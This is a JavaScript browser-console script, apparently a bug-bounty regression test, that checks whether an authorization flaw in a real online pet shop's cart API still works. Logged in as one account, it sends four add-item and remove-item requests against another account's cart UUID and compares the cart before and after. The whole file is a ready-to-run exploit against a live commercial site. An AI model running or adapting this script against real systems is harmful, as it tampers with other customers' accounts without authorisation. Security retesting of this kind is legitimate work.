// Test Original 2023 Attack Vectors
// Execute in browser console while logged in as Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"; // Account A's cart UUID

(async function () {
  console.log("[*] ========================================");
  console.log("[*] TESTING ORIGINAL 2023 VECTORS");
  console.log("[*] ========================================");

  // Get cart before
  const cartBefore = await fetch(
    `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`,
    { credentials: "include" }
  ).then((r) => r.json());

  console.log(`[+] Cart BEFORE: ${cartBefore.articles.length} items, ${cartBefore.summary.grandTotal} EUR`);

  const tests = [
    // Original Vector 1: Add product via /articles
    {
      name: "POST /articles (original)",
      url: `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles`,
      method: "POST",
      body: JSON.stringify({ offerId: 2966422, quantity: 1 }),
    },
    // Original Vector 2: Add product via /add
    {
      name: "POST /add (original)",
      url: `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/add`,
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: "offerId=2966422&quantity=1",
    },
    // Original Vector 3: Remove product via DELETE
    {
      name: "DELETE /articles/{id} (original)",
      url: `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles/${cartBefore.articles[0]?.id}`,
      method: "DELETE",
    },
    // Original Vector 4: Remove product via POST /remove
    {
      name: "POST /articles/{id}/remove (original)",
      url: `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles/${cartBefore.articles[0]?.id}/remove`,
      method: "POST",
    },
  ];

  for (const test of tests) {
    console.log(`\n[*] Testing: ${test.name}`);
    try {
      const response = await fetch(test.url, {
        method: test.method,
        credentials: "include",
        headers: test.headers || { "Content-Type": "application/json" },
        body: test.body,
      });

      const text = await response.text();
      console.log(`    Status: ${response.status}`);
      console.log(`    Response: ${text.substring(0, 200)}`);

      if (response.status === 200 || response.status === 201) {
        console.log(`    [!!!] SUCCESS - Original vector still works!`);
      }
    } catch (e) {
      console.log(`    Error: ${e.message}`);
    }
  }

  // Check cart after
  await new Promise((r) => setTimeout(r, 2000));
  const cartAfter = await fetch(
    `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`,
    { credentials: "include" }
  ).then((r) => r.json());

  console.log(`\n[+] Cart AFTER: ${cartAfter.articles.length} items, ${cartAfter.summary.grandTotal} EUR`);

  if (cartAfter.articles.length !== cartBefore.articles.length || 
      Math.abs(cartAfter.summary.grandTotal - cartBefore.summary.grandTotal) > 0.01) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] REGRESSION CONFIRMED!");
    console.log("[!!!] Original 2023 vectors still work!");
    console.log("[!!!] ========================================");
  }
})();





